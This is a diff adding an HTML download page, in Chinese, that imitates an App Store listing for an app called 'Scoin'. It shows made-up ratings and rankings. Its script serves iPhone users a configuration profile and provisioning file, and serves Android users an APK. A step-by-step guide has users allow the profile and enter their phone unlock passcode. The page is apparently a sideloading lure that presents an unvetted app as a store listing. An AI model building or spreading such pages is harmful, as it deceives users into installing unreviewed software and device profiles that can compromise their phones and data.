@@ -1,0 +1,231 @@
+<html>
+<head design-width="750">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="format-detection" content="telephone=no">
+<title>Scoin</title>
+<link rel="stylesheet" href="css/reset.css"><!--重置样式-->
+<link rel="stylesheet" href="css/style.css"><!--页面样式-->
+<link rel="stylesheet" href="css/swiper.min.css">
+<link rel="stylesheet" type="text/css" href="static/css/index.css">
+<script src="js/auto-size.js"></script><!--设置字体大小-->
+<script src="js/jquery.datetimepicker.fulls.js"></script>
+</head>
+<body ontouchstart="" onmouseover="">
+	<div class="mobile-wrap center">
+        <main>
+        	<div class="appItem">
+        		<div class="left"><img src="img/logo.png" alt=""></div>
+        		<div class="right">
+        			<strong>Scoin<span>3+</span></strong>
+        			<p>Scoin</p>
+        			<div class="installBox">
+        				<a class="down" href="javascript:;">免费安装</a>
+        				<a class="doubt" href="javascript:;">?</a>
+        			</div>
+        		</div>
+        		<div class="appTip">
+        			<div class="score">
+        			<div class="star">4.9 ★★★★★<var></var></div>
+        				<p>19k 个评分</p>
+        			</div>
+        			<div class="centerBox"> <i>#</i>3 </div>
+        			<div class="age">
+        				<b>4+</b>
+        				<p>年龄</p>
+        			</div>
+        		</div>
+				    <div class="app-intro">
+        <div class="app-intro-con" style="height: auto;">
+            <p style="padding: 8px 8px 8px 8px; color: white; background-color: #e64141; border-radius: 5px;">
+                1、安卓手机下载完点击安装即可<br>
+                2、Iphone手机点击安装完跳转设置进行安装。
+            </p>
+        </div>
+    </div>
+        	</div>
+        	<div class="comment">
+        		<strong class="publicTitle">评分及评论</strong>
+        		<div class="left">
+        		    <b>5.0</b>
+        			<p>满分 5 分</p>
+        		</div>
+        		<div class="right">
+        			<div class="star_row">
+        				<span class="s1"><i></i></span>
+        				<div class="lineBox"><var class="v1"></var></div>
+        			</div>
+        			<div class="star_row">
+        				<span class="s2"><i></i></span>
+        				<div class="lineBox"><var class="v2"></var></div>
+        			</div>
+        			<div class="star_row">
+        				<span class="s3"><i></i></span>
+        				<div class="lineBox"><var class="v3"></var></div>
+        			</div>
+        			<div class="star_row">
+        				<span class="s4"><i></i></span>
+        				<div class="lineBox"><var class="v4"></var></div>
+        			</div>
+        			<div class="star_row">
+        				<span class="s5"><i></i></span>
+        				<div class="lineBox"><var class="v5"></var></div>
+        			</div>
+        			<p>19k 个评分</p>
+        		</div>
+        	</div>
+        	<div class="newFunction">
+        		<strong class="publicTitle">新功能</strong>
+        		<p>小龙聊天演示</p>
+        	</div>
+        	<div class="appInfo">
+        		<strong class="publicTitle">信息</strong>
+        		<div class="box">
+        			<ul>
+        				<li>
+        					<span>大小</span>
+        					<p>24.5 MB</p>
+        				</li>
+        				<li>
+        					<span>兼容性</span>
+        					<p>需要 iOS 8.0 或更高版本。与 iPhone、iPad 和 iPod touch 兼容。</p>
+        				</li>
+        				<li>
+        					<span>语言</span>
+        					<p>英语,简体中文</p>
+        				</li>
+        				<li>
+        					<span>年龄分级</span>
+        					<p>限4岁以上</p>
+        				</li>
+        				<li>
+        					<span>Copyright</span>
+        					<p>© 2018 MobiFun Games Inc</p>
+        				</li>
+        				<li>
+        					<span>价格</span>
+        					<p>免费</p>
+        				</li>
+        				<li>
+        					<span>隐私政策</span>
+        					<p>✋</p>
+        				</li>
+        			</ul>
+        		</div>
+        	</div>
+        </main>
+		<div class="footer">
+			<p>免责声明：</p>
+			<p class="p2">本网站仅为开发者提供App的下载和安装托管，App内的内容和运营相关事项由App开发者负责，与本网站无关</p>
+		</div>
+		<div class="pup">
+			<div class="guide">
+				<i class="colse"></i>
+				<div class="pics">
+					<div class="swiper-container">
+					    <div class="swiper-wrapper">
+						     <div class="swiper-slide">
+						     	<div class="pic"><img src="img/0df0c_0_600_411.jpg" alt=""></div>
+						     	<div class="text">安装引导<br>第一步  允许打开配置描述文件</div>
+						     </div>
+						     <div class="swiper-slide">
+						     	<div class="pic"><img src="img/9179e_3_600_411.jpg" alt=""></div>
+						     	<div class="text">安装引导<br>第二步  点击右上角安装按钮</div>
+						     </div>
+						     <div class="swiper-slide">
+						     	<div class="pic"><img src="http://122.51.151.220/img/d3c74_2_600_411.jpg" alt=""></div>
+						     	<div class="text">安装引导<br>第三步  输入开机解锁密码 </div>
+						     </div>
+						     <div class="swiper-slide">
+						     	<div class="pic"><img src="img/0665a_1_600_411.jpg" alt=""></div>
+						     	<div class="text">安装引导<br>第四步  点击下方安装按钮 </div>
+						     </div>
+					    </div>
+					    <div class="swiper-pagination"></div>
+					</div>
+				</div>
+				<div class="smallTip"><a href="">什么是描述文件？</a></div>
+			</div>
+		</div>
+	
+	<div class="pupPic"><img src="img/5cbc4_5_1242_2007.png" alt=""></div>
+    </div><!--mobile_wrap-->
+
+	<script src="js/jquery-2.2.4.min.js"></script><!--jQ库-->
+	<script src="js/swiper-4.2.0.min.js"></script><!--轮播库-->
+	<script>
+        $("body").css("cursor","pointer");
+        
+        var ua = navigator.userAgent.toLowerCase();
+        var Sys = {};
+        var s;
+        (s = ua.match(/version\/([\d.]+).*safari/)) ? Sys.safari = s[1] : 0;
+
+
+        //判断设备是否为iPhone
+        if (/(iPhone|iPad|iPod|iOS)/i.test(ua)) {  
+            if (Sys.safari) {
+                $(".down").attr("href",'./sign.mobileconfig');
+                $(".down").click(function(event) {
+                    setTimeout(function(){
+                        if(confirm){
+                            location.href = "./app.mobileprovision";
+                        }
+                    },4500)
+                });
+                //打开引导弹窗
+                $(".doubt").click(function(event) {
+                    $(".pup").fadeIn();
+                    var swiper = new Swiper('.swiper-container',{
+                        loop: true,
+                        pagination: {
+                            el: '.swiper-pagination',
+                        },
+                    });
+                });
+            }else{
+                $("body").click(function(event) {
+                    $(".pupPic").show();
+                 });
+            }
+        } 
+        //判断是否QQ内置浏览器
+        else if(ua.indexOf(' qq')>-1 && ua.indexOf('mqqbrowser') <0){
+            $(".down").attr("href",'###');
+            $("body").click(function(event) {
+                $(".pupPic").show();
+             });
+        }
+        //判断Android
+        else if (/(Android)/i.test(ua)) {   
+            $(".down").attr("href",'./Android.apk');
+            //打开引导弹窗
+            $(".doubt").click(function(event) {
+                $(".pup").fadeIn();
+                var swiper = new Swiper('.swiper-container',{
+                    loop: true,
+                    pagination: {
+                        el: '.swiper-pagination',
+                    },
+                });
+            });
+        }
+        //在微信中打开
+        if (ua.match(/MicroMessenger/i) == "micromessenger") {
+            $(".down").attr("href",'###');
+            $("body").click(function(event) {
+                $(".pupPic").show();
+             });
+        }
+        
+		//关闭弹窗
+		$(".colse").click(function(event) {
+			$(".pup").fadeOut();
+		});
+
+        
+	</script>
+</body>
+</html>
